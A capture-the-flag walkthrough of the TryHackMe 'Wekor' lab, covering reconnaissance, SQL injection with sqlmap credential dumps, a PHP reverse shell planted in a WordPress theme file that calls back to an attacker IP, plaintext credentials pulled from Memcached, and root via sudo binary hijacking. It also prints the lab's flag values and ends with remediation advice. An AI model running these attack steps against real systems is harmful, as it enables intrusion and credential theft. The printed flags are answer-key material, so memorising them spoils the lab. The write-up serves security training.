# TryHackMe: Wekor — Penetration Testing & Walkthrough Report

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme&logoColor=white)
![OS](https://img.shields.io/badge/OS-Linux%20(Ubuntu)-FCC624?style=for-the-badge&logo=linux&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![Category](https://img.shields.io/badge/Type-Adversary%20Simulation-blueviolet?style=for-the-badge)

---

## Executive Summary

This report documents the end-to-end penetration testing process conducted against the **Wekor** lab machine on TryHackMe. The engagement simulated realistic attack paths to uncover critical perimeter and internal vulnerabilities, achieve remote code execution (RCE), execute lateral movement, and escalate privileges to full `root` control.

| Metric | Engagement Details |
|---|---|
| **Target Machine** | Wekor (TryHackMe) |
| **Target IP** | `10.x.x.x` *(Redacted)* |
| **Operating System** | Ubuntu Linux 16.04 LTS |
| **Initial Foothold** | SQL Injection → WordPress Admin → PHP Reverse Shell (RCE) |
| **Lateral Movement** | Internal Unauthenticated Memcached Dump → User `Orka` |
| **Privilege Escalation** | Sudo Directory Write Abuse → Binary Hijacking (`root`) |
| **Impact Rating** | **CRITICAL** (Full Host Compromise) |

---

## Adversary Attack Chain

```
[ RECON ] ──► [ SQLi ] ──► [ WP RCE ] ──► [ MEMCACHED ] ──► [ ROOT ]
  Nmap          Coupon       Theme Editor    Cred Dump        Binary
  VHost fuzz    sqlmap       404.php shell   Orka creds       Hijack
```

---

## Table of Contents

1. [Phase 1: Reconnaissance & Enumeration](#phase-1-reconnaissance--enumeration)
2. [Phase 2: Vulnerability Assessment & Exploitation](#phase-2-vulnerability-assessment--exploitation)
3. [Phase 3: Initial Foothold (RCE)](#phase-3-initial-foothold-rce)
4. [Phase 4: Lateral Movement](#phase-4-lateral-movement)
5. [Phase 5: Privilege Escalation to Root](#phase-5-privilege-escalation-to-root)
6. [Flags](#flags)
7. [Remediation & Defense Hardening](#remediation--defense-hardening)

---

## Phase 1: Reconnaissance & Enumeration

### 1. Port & Service Discovery

An initial full TCP port scan was executed to enumerate open services, versions, and standard scripts:

```bash
nmap -sC -sV -A -p- <TARGET_IP> -oN nmap_scan.txt
```

**Scan Output:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 9 disallowed entries
| /workshop/ /root/ /lol/ /agent/ /feed /crawler /boot
|_/comingreallysoon /interesting
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key Findings:**
- Port 22 (SSH) — OpenSSH 7.2p2
- Port 80 (HTTP) — Apache 2.4.18 with robots.txt exposing hidden paths

### 2. Web Enumeration — robots.txt

Visiting `http://<TARGET_IP>/robots.txt` exposed disallowed paths. Navigating to `/comingreallysoon` revealed the e-commerce platform at `/it-next/`.

### 3. Virtual Host Discovery

**Baseline request size check for false-positive filtering:**

```bash
curl -s -H "Host: fake.wekor.thm" http://<TARGET_IP> | wc -c
# Output: 23
```

**Fuzzing virtual subdomains:**

```bash
ffuf -u http://<TARGET_IP>/ -H "Host: FUZZ.wekor.thm" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 23
```

**Result:**
```
site    [Status: 200, Size: 143, Words: 27, Lines: 6]
```

**Update /etc/hosts:**

```bash
echo "<TARGET_IP>  wekor.thm site.wekor.thm" | sudo tee -a /etc/hosts
```

Navigating to `http://site.wekor.thm/wordpress/` revealed an active WordPress instance.

---

## Phase 2: Vulnerability Assessment & Exploitation

### 1. SQL Injection (SQLi)

The shopping cart coupon field at `http://wekor.thm/it-next/` was identified as vulnerable to SQL injection.

**Test payload injected into coupon field:**
```
' OR 1=1 -- -
```

The POST request was intercepted via Burp Suite and saved as `req.txt`.

**Step 1: Enumerate databases**

```bash
sqlmap -r req.txt --dbs --batch
```

**Output:**
```
available databases [6]:
[*] coupons
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] wordpress
```

**Step 2: Enumerate tables in wordpress database**

```bash
sqlmap -r req.txt -D wordpress --tables --batch
```

**Output:**
```
Database: wordpress
[12 tables]
+-----------------------+
| wp_commentmeta        |
| wp_users              |
| ... (10 more)         |
+-----------------------+
```

**Step 3: Dump WordPress user credentials**

```bash
sqlmap -r req.txt -D wordpress -T wp_users --dump --batch
```

**Database Extraction Results:**

```
+----+--------------+------------------------------------+------------------+
| ID | user_login   | user_pass                          | user_email       |
+----+--------------+------------------------------------+------------------+
| 1  | admin        | $P$BDzIL...                        | admin@wekor.thm  |
| 2  | wp_yura      | $P$B9zBvg... (soccer13)            | yura@wekor.thm   |
| 3  | wp_jeffrey   | $P$B/8QzK...                       | jeffrey@wekor.thm|
| 4  | wp_eagle     | $P$B8qWvj...                       | eagle@wekor.thm  |
+----+--------------+------------------------------------+------------------+
```

### 2. Password Cracking

sqlmap automatically cracked the hashes using its built-in dictionary:

```
soccer13  →  wp_yura
```

---

## Phase 3: Initial Foothold (RCE)

### 1. WordPress Authentication

Login at `http://site.wekor.thm/wordpress/wp-login.php` with credentials `wp_yura:soccer13` succeeded with administrative privileges.

### 2. Theme Template Modification

Navigated to **Appearance → Theme Editor → 404.php** (active theme: Twenty Twenty-One).

Replaced file contents with pentestmonkey PHP reverse shell payload:

```php
<?php
set_time_limit (0);
$ip = '<ATTACKER_TUN0_IP>';  // tun0 interface IP
$port = 4444;
// ... (full reverse shell code)
?>
```

Clicked **Update File** — confirmed with "File edited successfully."

### 3. Spawning the Shell

**Terminal 1 — Netcat listener:**

```bash
nc -lvnp 4444
```

**Trigger payload in browser:**

```
http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/404.php
```

**Shell received:**

```
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP]
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Upgrade to interactive shell:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Phase 4: Lateral Movement

### 1. Internal Service Enumeration

Enumerated listening services on the target:

```bash
ss -tlnp
```

**Output:**
```
LISTEN  127.0.0.1:11211   *:*    ← Memcached
LISTEN  *:22              *:*    ← SSH
LISTEN  127.0.0.1:3306    *:*    ← MySQL
LISTEN  :::80             :::*   ← HTTP
```

Port `11211` = Memcached running internally, unauthenticated.

### 2. Extracting Cached Credentials

```bash
telnet 127.0.0.1 11211
```

```
get username
VALUE username 0 4
Orka
END

get password
VALUE password 0 15
OrkAiSC00L24/7$
END
```

### 3. Lateral Movement to Orka

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
su Orka
# Password: OrkAiSC00L24/7$

cat /home/Orka/user.txt
# 1a26a6d51c0172400add0e297608dec6
```

---

## Phase 5: Privilege Escalation to Root

### 1. Sudo Rights Analysis

```bash
sudo -l
```

**Output:**
```
User Orka may run the following commands on osboxes:
    (ALL : ALL) NOPASSWD: /home/Orka/Desktop/bitcoin
```

### 2. Directory Write Abuse & Binary Hijacking

While `/home/Orka/Desktop/bitcoin` had restricted permissions, the parent directory `/home/Orka/Desktop/` was fully owned and writable by Orka. This permitted directory renaming and binary replacement:

```bash
# Rename the original directory
mv /home/Orka/Desktop /home/Orka/Desktop.bak

# Create a replacement Desktop directory
mkdir /home/Orka/Desktop

# Place /bin/bash as the target executable
cp /bin/bash /home/Orka/Desktop/bitcoin
chmod +x /home/Orka/Desktop/bitcoin

# Execute via sudo and read root flag
echo 'OrkAiSC00L24/7$' | sudo -S /home/Orka/Desktop/bitcoin -pc 'cat /root/root.txt'
```

**Result:**
```
root@osboxes:/# id
uid=0(root) gid=0(root) groups=0(root)

root flag: f4e788f87cc3afaecbaf0f0fe9ae6ad7
```

---

## Flags

| Flag | Hash |
|---|---|
| **User** (`/home/Orka/user.txt`) | `1a26a6d51c0172400add0e297608dec6` |
| **Root** (`/root/root.txt`) | `f4e788f87cc3afaecbaf0f0fe9ae6ad7` |

---

## Remediation & Defense Hardening

| Vulnerability Vector | Severity | Recommended Fix |
|---|---|---|
| **SQL Injection (E-Commerce)** | 🔴 Critical | Implement parameterized queries (PDO/Prepared Statements). Never use dynamic string concatenation in SQL. |
| **WordPress Dashboard File Editing** | 🟠 High | Disable theme/plugin editing by adding `define('DISALLOW_FILE_EDIT', true)` to `wp-config.php`. |
| **Unauthenticated Memcached** | 🟠 High | Bind Memcached to `127.0.0.1` only and enable SASL authentication. Never store plaintext credentials in cache. |
| **Insecure Sudo Privileges** | 🔴 Critical | Never grant `NOPASSWD` sudo rights on binaries in user-writable directories. Move scripts to root-owned paths with `755` permissions. |

---

## Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port and service enumeration |
| `ffuf` | Virtual host fuzzing |
| `Burp Suite` | HTTP request interception |
| `sqlmap` | Automated SQL injection exploitation |
| `netcat` | Reverse shell listener |
| `telnet` | Memcached interaction |
| `python3` | Shell stabilization |

---

## Disclaimer

This technical walkthrough is created strictly for educational purposes, defensive security research, and authorized penetration testing practice on TryHackMe. Unauthorized scanning or exploitation of systems without prior written consent is illegal.
